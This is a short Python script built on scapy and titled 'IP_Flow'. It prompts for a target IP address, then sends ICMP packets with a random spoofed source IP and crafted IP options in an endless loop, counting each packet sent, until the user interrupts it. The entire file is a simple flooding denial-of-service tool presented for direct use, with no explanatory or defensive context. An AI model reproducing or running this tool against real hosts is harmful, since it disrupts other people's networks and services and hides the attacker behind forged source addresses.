import scapy.all as scapy
import os


def IP_Data_Flow():

	clear = os.system('clear')

	print("**************************************")
	print("            IP_Flow")
	print("**************************************")

	print("Please input your target's IP")
	target = input("[IP_Flow]#")
	src_ip = scapy.RandIP()
	num =0 
	try:
		while True:
			packet = scapy.IP(src=src_ip,dst=target,options=[scapy.IPOption_Stream_Id(copy_flag=1),scapy.IPOption_EOL(),scapy.IPOption_EOL()])/scapy.ICMP()
			scapy.send(packet,verbose=False)
			num +=1
			print("Sent"+str(num)+"packets")
	except KeyboardInterrupt:
		print("Ctrl + C detected ......")
	
IP_Data_Flow()